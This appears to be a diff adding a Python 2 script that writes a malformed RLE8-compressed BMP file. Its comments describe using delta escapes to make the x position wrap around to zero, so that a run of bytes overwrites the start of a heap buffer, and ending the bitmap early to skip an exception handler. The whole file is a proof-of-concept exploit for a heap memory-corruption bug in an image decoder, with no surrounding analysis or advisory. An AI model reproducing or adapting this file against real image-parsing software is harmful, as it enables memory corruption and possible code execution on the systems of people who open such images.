@@ -1,0 +1,76 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+import os
+import sys
+import struct
+
+RLE8 = 1
+RLE4 = 2
+COMPRESSION = RLE8
+BIT_COUNT = 8
+CLR_USED = 1 << BIT_COUNT
+WIDTH = 0xF0
+HEIGHT = 1
+
+def get_bitmap_file_header(file_size, bits_offset):
+    return struct.pack('<2sIHHI', 'BM', file_size, 0, 0, bits_offset)
+
+def get_bitmap_info_header(data_size):
+    return struct.pack('<IIIHHIIIIII',
+        0x00000028,
+        WIDTH,
+        HEIGHT,
+        0x0001,
+        BIT_COUNT,
+        COMPRESSION,
+        data_size,
+        0x00000000,
+        0x00000000,
+        CLR_USED,
+        0x00000000)
+
+def get_bitmap_info_colors():
+    # B, G, R, Reserved
+    rgb_quad = '\x00\x00\xFF\x00'
+    return rgb_quad * CLR_USED
+
+def get_bitmap_data():
+    # set ypos to 0 so that we'll be at the beginning of the heap buffer
+    # ypos = (HEIGHT - 1) = 0, no need to bother
+
+    # set xpos to 0xFFFFFF00
+    data = '\x00\x02\xFF\x00' * (0xFFFFFF00 / 0xFF)
+    # set xpos to 0xFFFFFF0C
+    data += '\x00\x02\x0C\x00'
+
+    # 0xFFFFFF0C + 0xF4 = 0
+    # 0xF4 bytes of 0x10
+    data += '\xF4\x10'
+
+    # mark end of bitmap to skip CxxThrowException
+    data += '\x00\x01'
+
+    return data
+
+def generate_bitmap(filepath):
+    data = get_bitmap_data()
+    data_size = len(data)
+
+    bmi_header = get_bitmap_info_header(data_size)
+    bmi_colors = get_bitmap_info_colors()
+
+    bmf_header_size = 0x0E
+    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)
+    file_size = bits_offset + data_size
+    bmf_header = get_bitmap_file_header(file_size, bits_offset)
+    with open(filepath, 'wb') as f:
+        f.write(bmf_header)
+        f.write(bmi_header)
+        f.write(bmi_colors)
+        f.write(data)
+
+if __name__ == '__main__':
+    if len(sys.argv) != 2:
+        print 'Usage: %s <output.bmp>' % os.path.basename(sys.argv[0])
+        sys.exit(1)
+    generate_bitmap(sys.argv[1])
